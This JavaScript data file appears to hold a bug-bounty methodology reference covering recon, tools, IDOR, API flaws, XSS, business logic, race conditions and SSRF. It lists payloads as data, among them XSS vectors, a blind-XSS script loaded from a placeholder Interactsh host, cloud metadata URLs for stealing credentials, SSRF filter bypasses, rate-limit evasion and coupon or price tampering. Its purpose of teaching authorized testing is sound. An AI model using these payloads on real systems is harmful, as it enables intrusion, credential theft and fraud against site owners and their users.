// ============================================================
// REFERENCE LIBRARY CONTENT
// Sources: OWASP Testing Guide, OWASP API Security Top 10 (2023),
// PortSwigger Web Security Academy, public disclosed reports.
// This is a methodology + pattern reference for AUTHORIZED testing
// (bug bounty programs, pentests you're scoped for) — not an
// auto-exploit tool.
// ============================================================

const GLOBAL_RECON = {
  title: "Global Recon Pass",
  subtitle: "Run once per target, before diving into any specific bug type",
  sections: [
    {
      h: "Map the attack surface",
      items: [
        "Crawl the app manually (click everything) while proxying through Burp Community / ZAP / Caido to build a full sitemap",
        "Run Katana or gau/waybackurls to pull historical + crawled URLs",
        "Pull every JS file and grep for endpoints, hidden params, hardcoded keys — use LinkFinder for this",
        "Check /robots.txt, /sitemap.xml, and any exposed .map (source map) files for hidden routes",
        "Enumerate subdomains with subfinder + amass, then filter live hosts with httpx",
        "Run Nuclei against the discovered hosts for known misconfigs before manual testing"
      ]
    },
    {
      h: "Build your reference map",
      items: [
        "List every role/permission tier the app has (admin, user, guest, team-member, billing-owner, etc.)",
        "Create at least two test accounts across different roles — mandatory before BAC/IDOR testing",
        "Note every place an identifier appears: URL path, query params, JSON body, headers, JWT claims, GraphQL node IDs",
        "Identify the tech stack (Wappalyzer) — framework tells you where XSS is plausible, cloud host tells you SSRF metadata targets",
        "Find hidden API docs: /swagger.json, /openapi.json, /graphql, /api-docs, leaked Postman collections in JS",
        "Diff the mobile app's API calls against the web app's — mobile APIs are frequently less restricted"
      ]
    }
  ]
};

const TOOLS = {
  title: "Free Toolkit",
  subtitle: "Everything below is free or has a genuinely usable free tier",
  groups: [
    { h: "Proxy / intercept", items: [
      "Burp Suite Community — manual testing, Repeater; Turbo Intruder extension (free) handles race conditions",
      "OWASP ZAP — fully open-source, has its own automated scanner",
      "Caido — newer free-tier proxy, clean UI, gaining traction in bug bounty circles"
    ]},
    { h: "Subdomain / asset discovery", items: [
      "subfinder + amass — subdomain enumeration",
      "httpx — checks which discovered hosts are alive",
      "Nuclei — template-based scanner for known misconfig patterns"
    ]},
    { h: "Crawling / JS analysis", items: [
      "gau / waybackurls — historical URLs, great for finding old API endpoints",
      "LinkFinder — extracts endpoints/params from JS files",
      "Katana — modern crawler, handles JS-heavy SPAs"
    ]},
    { h: "API / GraphQL", items: [
      "InQL (Burp extension) — GraphQL introspection and query mapping",
      "Postman (free tier) — manual API request building and collections"
    ]},
    { h: "JWT", items: [
      "jwt.io — quick decode",
      "jwt_tool — tamper, alg-confusion, and signature-stripping tests"
    ]},
    { h: "Out-of-band / blind detection", items: [
      "Interactsh — free, open-source Collaborator alternative for blind SSRF and blind XSS callbacks"
    ]}
  ]
};

const BUGS = {

  idor: {
    id: "idor",
    name: "IDOR / BOLA / Broken Access Control",
    tag: "API1:2023",
    severity: "high",
    blurb: "Any object referenced by an ID that isn't properly re-checked against the requester's permissions.",
    recon: [
      "List every place an ID shows up: URL path, query params, request body, headers (X-User-Id), JWT claims, GraphQL node IDs, WebSocket messages",
      "Note ID formats in use: sequential integers (easy to enumerate), UUIDs (harder but check if leaked elsewhere), base64/hashed IDs (decode and try incrementing the decoded value)",
      "Map the full role hierarchy (guest/user/team-member/admin) before you start — you need this to know what 'higher privilege' even means here",
      "Find every response that leaks another user's ID (activity feeds, autocomplete, invite lists, error messages)"
    ],
    methodology: [
      "Horizontal test: log in as User A, capture a request for their own resource, replace the ID with User B's ID while still using User A's session/token",
      "Vertical test: as a low-privilege user, call an endpoint/action that should require a higher role",
      "Context test: for shared/team resources, check whether a user outside the team/org can still access it via direct ID reference",
      "Method swap: try the same endpoint with GET/POST/PUT/PATCH/DELETE — auth checks are often implemented on only one verb",
      "Try the same object reference across API versions (/v1/, /v2/, /internal/) and across web vs mobile API — checks are frequently inconsistent",
      "For GraphQL: query the same node type by ID directly even if the UI never exposes that path"
    ],
    payloads: [
      "Swap numeric ID: /api/orders/1042 → /api/orders/1043 (someone else's order)",
      "Decode a base64/hashed ID, increment the underlying integer, re-encode, and resubmit",
      "Path traversal style: /api/user/../admin/settings",
      "Case/format variants: /API/Orders/1043, /api/orders/1043/, /api/orders/1043.json",
      "Wildcard/batch params: orderId=1043 → orderId[]=1043&orderId[]=1044 (mass IDOR via array injection)",
      "Object ID in JSON body instead of URL: {\"user_id\": \"victim-id\"} on an update/delete call"
    ],
    confirmation: [
      "HTTP 200 with another user's data returned, even if the UI wouldn't normally show you the button/link to get there",
      "Data leakage inside a 403/404 body (partial object still returned before the check fails)",
      "Successful state change confirmed by logging back in as the victim account and seeing the modification",
      "Response time or size differs meaningfully between 'exists but forbidden' and 'does not exist' — useful for enumeration even without direct data access"
    ],
    bypasses: [
      "If numeric IDs are blocked by a WAF rule matching sequential enumeration, slow down requests or randomize order",
      "If the app checks ownership only on the primary resource, look for nested/child resources that skip the same check (e.g., /orders/{id}/items/{itemId})",
      "Try the same request through a different content-type (JSON vs form-urlencoded vs XML) — some frameworks apply auth middleware only to one parser path",
      "Header-based overrides: X-Forwarded-For, X-Original-URL, X-Rewrite-URL can sometimes bypass path-based access rules on reverse proxies"
    ],
    tools: ["Burp Repeater for manual swaps", "Autorize (Burp extension) automates the 'replay as lower-priv user' check", "InQL for GraphQL node enumeration"],
    report: "Endpoint + method, victim account used, exact request showing the swapped ID, response proving unauthorized access, and impact (what data/action was exposed)."
  },

  api: {
    id: "api",
    name: "API-Specific Issues",
    tag: "OWASP API Top 10",
    severity: "high",
    blurb: "Mass assignment, broken function-level auth, resource exhaustion, and shadow/undocumented endpoints.",
    recon: [
      "Pull the OpenAPI/Swagger/GraphQL schema if exposed — it hands you the entire object model and every field name",
      "Diff request/response bodies across roles to spot fields the API accepts but the UI never shows (mass assignment candidates)",
      "Enumerate API versions and staging/internal hosts — old versions often skip newer authorization middleware",
      "Check for GraphQL introspection (`{__schema{types{name}}}`) if the endpoint doesn't explicitly disable it"
    ],
    methodology: [
      "Mass assignment: take a normal 'update profile' request and add extra fields the schema suggests exist (role, isAdmin, isVerified, balance)",
      "Broken function-level auth: take an admin-panel request (found via JS/docs) and replay it with a normal user's token",
      "Resource consumption: send oversized payloads, large pagination limits, or repeated expensive queries (GraphQL nested queries) to check for missing rate/size limits",
      "Improper inventory: probe /v1/, /v2/, /beta/, /internal/, /admin-api/ variants of every discovered endpoint",
      "Unsafe consumption: if the API itself calls third-party APIs, check whether it blindly trusts data (redirects, sizes) coming back"
    ],
    payloads: [
      "{\"email\":\"me@test.com\",\"role\":\"admin\"} on a self-registration or profile-update endpoint",
      "GraphQL introspection query: query { __schema { types { name fields { name } } } }",
      "Deeply nested GraphQL query to test query-cost limiting (nested connections repeated 10+ levels)",
      "Batch request abuse: sending an array of 1000 items to an endpoint expecting one",
      "Content-Type juggling: send the same body as application/json, then application/xml, then multipart — inconsistent parsers sometimes skip validation on one"
    ],
    confirmation: [
      "Extra field you sent is reflected back / actually applied (role changed, balance changed, verified flag flipped)",
      "Admin-only response data returned to a standard-tier token",
      "No error or throttling after sending an abnormally large/expensive request — confirms missing rate limiting",
      "An old API version accepts a request the current version correctly rejects"
    ],
    bypasses: [
      "If mass assignment fields are filtered on nested objects, try flattening (user.role vs user[role] vs userRole)",
      "If introspection is disabled, brute-force common type/field names using a wordlist against the GraphQL endpoint",
      "If rate limiting is IP-based, rotate via X-Forwarded-For header or use multiple session tokens in parallel"
    ],
    tools: ["InQL for GraphQL", "Postman for structured API fuzzing", "Nuclei API templates"],
    report: "Full request/response pair showing the unexpected field or endpoint accepted, the schema/version involved, and concrete impact (privilege change, data exposure, cost/DoS potential)."
  },

  xss: {
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    tag: "Injection",
    severity: "medium",
    blurb: "Reflected, stored, DOM-based, blind, and mutation XSS across every injection context.",
    recon: [
      "Identify every reflection point: search boxes, URL params echoed in the page, error messages, filenames, profile fields shown to other users",
      "Fingerprint the frontend framework — React/Vue/Angular auto-escape by default, so look specifically for dangerouslySetInnerHTML, v-html, or raw template rendering",
      "Grep JS for DOM sinks: innerHTML, outerHTML, document.write, eval, setTimeout with string args, location.href assignments from user input",
      "Check for a Content-Security-Policy header — its exact rules tell you which bypass techniques are even worth trying"
    ],
    methodology: [
      "Reflected: inject a unique marker string into every input/param, then search the rendered response for it unescaped",
      "Stored: submit payload in any persisted field (name, comment, bio, filename) and view it from a different session/account",
      "DOM-based: trace user-controlled data (location.hash, postMessage, localStorage) into a sink without a server round-trip",
      "Blind: submit payloads with an out-of-band callback (Interactsh) in fields an admin/support agent might view later (support tickets, contact forms, log viewers)",
      "Mutation XSS (mXSS): test payloads that look safe pre-sanitization but mutate into executable markup once the browser reparses the DOM"
    ],
    payloads: [
      "Basic: <script>alert(document.domain)</script>",
      "Attribute-context breakout: \" onmouseover=\"alert(1)",
      "No-script event handlers (when <script> is filtered): <img src=x onerror=alert(1)>, <svg onload=alert(1)>",
      "JS-string context: '-alert(1)-'  or  \";alert(1);//",
      "URL-context: javascript:alert(1) (in href/src attributes that don't validate scheme)",
      "Encoding bypasses: &#x3C;script&#x3E;, %3Cscript%3E, unicode homoglyphs for filtered characters",
      "Polyglot (works across several contexts at once): jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//",
      "CSP-bypass via JSONP/whitelisted domains: if CSP allows a domain hosting a JSONP endpoint, chain through it",
      "Blind XSS with callback: <script src=https://YOUR-ID.interact.sh></script>"
    ],
    confirmation: [
      "alert()/console log actually fires in the browser when the page is viewed as the victim, not just reflected in raw HTML",
      "Out-of-band callback received on your Interactsh listener for blind payloads",
      "Payload survives a page reload / different session for stored XSS",
      "CSP report-only or violation logged, telling you which parts of your payload were blocked vs allowed"
    ],
    bypasses: [
      "If angle brackets are stripped but not quotes, break out of an existing attribute instead of injecting new tags",
      "If a WAF blocks 'script' literally, use case variation (ScRiPt), null bytes, or alternative tags (svg, img, iframe, details/ontoggle)",
      "If output is HTML-encoded but placed inside a JS variable, target the JS-string context instead of HTML",
      "If CSP blocks inline scripts, look for 'unsafe-eval', allowed CDNs you can abuse, or a JSONP endpoint on an allowed origin"
    ],
    tools: ["Burp/ZAP for reflection tracing", "Interactsh for blind XSS", "Browser DevTools for tracing DOM sinks"],
    report: "Injection point, exact payload, context (HTML/attr/JS/URL), proof of execution (screenshot/callback), and whether it's reflected/stored/DOM/blind."
  },

  bizlogic: {
    id: "bizlogic",
    name: "Business Logic Flaws",
    tag: "Workflow Abuse",
    severity: "high",
    blurb: "Abusing the intended flow of the app rather than breaking its code — the hardest class to template.",
    recon: [
      "Map the full multi-step flow end to end (signup → verification → checkout → confirmation) and note what data/state moves between each step",
      "Identify anything with a limit: free trial, coupon uses, referral bonus, rate-limited action, one-time discount",
      "Watch for client-side-only validation — price/quantity shown and calculated in JS, then submitted to the server",
      "Note anything that assumes a fixed order of operations (e.g., payment must happen before shipping is calculated)"
    ],
    methodology: [
      "Step-skipping: jump directly to a later step's endpoint without completing earlier ones (e.g., call the 'confirm order' endpoint without a valid cart)",
      "Step-reordering: replay steps out of order or repeat an early step after a later one to see if state resets favorably",
      "Parameter tampering: modify price, quantity, discount %, or currency in the request even if the UI doesn't expose that field",
      "Negative/zero/overflow values: quantity = -1, price = 0, discount = 999999",
      "Token/coupon reuse: reuse a one-time code across multiple accounts or multiple times on one account",
      "Trial/limit reset: check if deleting and recreating an account (or changing one field like email) resets a 'used' flag"
    ],
    payloads: [
      "quantity=-1 on a cart line item (can sometimes net a negative total, i.e., money added instead of charged)",
      "price=0.01 or price=0 injected into a checkout body that normally computes price server-side",
      "coupon=WELCOME10 submitted from a second account after already being redeemed once",
      "Currency swap: switch currency param to one with a favorable exchange rate the backend doesn't recalculate correctly",
      "Replay the 'apply discount' request multiple times in the same session (stacking discounts not intended to stack)"
    ],
    confirmation: [
      "Final charged/credited amount doesn't match what the legitimate flow should produce",
      "An action completes despite a precondition being skipped (e.g., order confirmed without payment webhook firing)",
      "A limit (trial, coupon, referral) is bypassed and repeatable beyond its intended cap",
      "State ends up logically inconsistent — e.g., item marked 'shipped' with no valid payment record"
    ],
    bypasses: [
      "If the client blocks negative input in the UI, submit the raw request directly via Burp Repeater instead of the form",
      "If server validates the request but not against the current session's actual cart state, try referencing a different session's cart ID",
      "If a limit is tied to email, test whether it's actually enforced on a normalized version of the email (many apps miss + aliasing or dot-variants on Gmail-style addresses)"
    ],
    tools: ["Burp Repeater/Intruder for parameter fuzzing", "Manual multi-account testing (this class is mostly manual reasoning, not payload lists)"],
    report: "Full step-by-step flow you followed, which step/parameter was abused, expected vs actual outcome, and financial/operational impact."
  },

  race: {
    id: "race",
    name: "Race Conditions",
    tag: "Concurrency",
    severity: "high",
    blurb: "Exploiting the timing window between a check and the action that follows it.",
    recon: [
      "Find anything involving a shared counter or balance: wallet top-ups, coupon codes, 'claim once' buttons, follower/like counts",
      "Find anything with a uniqueness constraint: account creation with unique email/username, one-per-user actions",
      "Identify irreversible or high-value actions specifically — that's where a race condition actually has impact worth reporting",
      "Check response timing for the target endpoint — race conditions are easier to win against slower endpoints with a real gap between check and commit"
    ],
    methodology: [
      "Single-packet attack: use Turbo Intruder (free Burp extension) to fire near-simultaneous requests that land in the same processing window, minimizing network jitter",
      "Multi-threaded burst: alternative to single-packet, fire 10-50 concurrent requests at the target endpoint with a script (or Intruder's 'null payloads' + high thread count)",
      "Target the check-then-act gap: anything that reads a balance/state, decides, then writes back is a candidate (redeem coupon → check if used → mark used)",
      "Test across resource boundaries: same coupon code from two different accounts fired simultaneously, not just two requests from one account"
    ],
    payloads: [
      "20 simultaneous requests to redeem the same single-use coupon code",
      "Simultaneous 'transfer funds' requests from an account with just enough balance for one transfer",
      "Simultaneous account-creation requests using the same email to test uniqueness enforcement",
      "Simultaneous 'like'/'vote' requests to see if the counter increments more than once per intended action",
      "Simultaneous password-reset or email-verification requests to test token single-use logic"
    ],
    confirmation: [
      "A single-use resource (coupon, invite code, discount) gets applied/consumed more than once",
      "A balance or counter ends up in a state that shouldn't be reachable (negative balance, double credit)",
      "Two accounts are created with what should be a unique constraint (same email)",
      "Server logs or database state shows two 'winning' requests that should have been mutually exclusive"
    ],
    bypasses: [
      "If naive concurrent requests don't win the race due to network jitter, switch to Turbo Intruder's single-packet attack, which queues requests at the TCP level to land within microseconds of each other",
      "If the endpoint is behind a load balancer with multiple backend instances, increase concurrency — the race window may only appear when two different instances handle requests simultaneously",
      "If a naive lock is present, try racing a related-but-different endpoint that touches the same underlying resource without the same lock"
    ],
    tools: ["Turbo Intruder (free Burp extension) — the standard tool for this class", "Custom script with async HTTP requests as a fallback"],
    report: "Endpoint, exact concurrency technique used, number of requests fired vs number that succeeded, and the resulting inconsistent state as proof."
  },

  ssrf: {
    id: "ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    tag: "API7:2023",
    severity: "critical",
    blurb: "Tricking the server into making requests to internal or attacker-chosen destinations.",
    recon: [
      "Find every feature that fetches a URL server-side: webhooks, 'import from link', avatar-from-URL, PDF/screenshot generators, link previews, third-party integrations",
      "Confirm what cloud infra the app runs on (AWS/GCP/Azure) — this determines which metadata endpoint is worth testing",
      "Check whether the URL-fetching feature validates scheme, host, or just format — try a completely malformed URL first to see what error you get back (reveals validation logic)",
      "Note whether responses to the fetch are shown back to you (full/partial SSRF) or not (blind — you'll need out-of-band confirmation)"
    ],
    methodology: [
      "Direct internal IP test: point the fetch feature at 127.0.0.1, localhost, 169.254.169.254, and internal RFC1918 ranges (10.x, 172.16.x, 192.168.x)",
      "Cloud metadata test: target the cloud-specific metadata endpoint to try to leak IAM credentials/tokens",
      "Blind SSRF: point the feature at your own Interactsh listener — a callback confirms the request fired even with no visible response",
      "Protocol smuggling: try file://, gopher://, dict:// schemes if http(s) is blocked but the parser doesn't restrict scheme",
      "DNS rebinding: use a domain that resolves to an allowed IP on first check then to an internal IP on the actual fetch, if the app validates then fetches separately"
    ],
    payloads: [
      "http://127.0.0.1/ and http://localhost/ — basic loopback check",
      "http://169.254.169.254/latest/meta-data/ (AWS), http://169.254.169.254/computeMetadata/v1/ with header Metadata-Flavor: Google (GCP), http://169.254.169.254/metadata/instance?api-version=2021-02-01 with header Metadata: true (Azure)",
      "URL-parser confusion: http://allowed-domain.com@169.254.169.254/, http://169.254.169.254#allowed-domain.com, http://[::ffff:169.254.169.254]/",
      "Decimal/octal/hex IP encoding: http://2130706433/ (decimal for 127.0.0.1), http://0177.0.0.1/ (octal)",
      "Redirect-based bypass: host a URL on your own server that 302-redirects to the internal target, in case the app validates the initial URL but blindly follows redirects",
      "gopher:// payloads to reach internal services that speak plaintext protocols (Redis, internal HTTP APIs) when direct http fetch is blocked"
    ],
    confirmation: [
      "Metadata/credentials or internal service banner returned directly in the response (full SSRF)",
      "Interactsh callback received, proving the server made the outbound request even without visible response data (blind SSRF)",
      "Different response time/error for internal-but-closed ports vs internal-but-open ports (port-scanning via timing, confirms internal network reach)",
      "A redirect-based payload successfully reaches the internal target after the initial URL passed validation"
    ],
    bypasses: [
      "If a domain/IP blocklist is used, test alternate encodings (decimal, octal, IPv6-mapped, URL-embedded credentials) since blocklists rarely cover all representations",
      "If only http/https schemes are allowed, check whether the underlying HTTP client still honors redirects to other schemes",
      "If the app resolves DNS once for validation and again for the actual request, attempt DNS rebinding between the two lookups",
      "If cloud metadata IP is explicitly blocked, check for the newer IMDSv2-style token requirement bypass or alternate metadata hostnames (e.g., link-local IPv6 metadata address)"
    ],
    tools: ["Interactsh for blind confirmation", "Burp Collaborator alternative via self-hosted Interactsh server", "curl for manual scheme/encoding tests"],
    report: "The vulnerable feature/endpoint, exact payload URL used, evidence of internal reach (data returned or OOB callback), and impact (credential leak, internal service access, port scan capability)."
  }
};
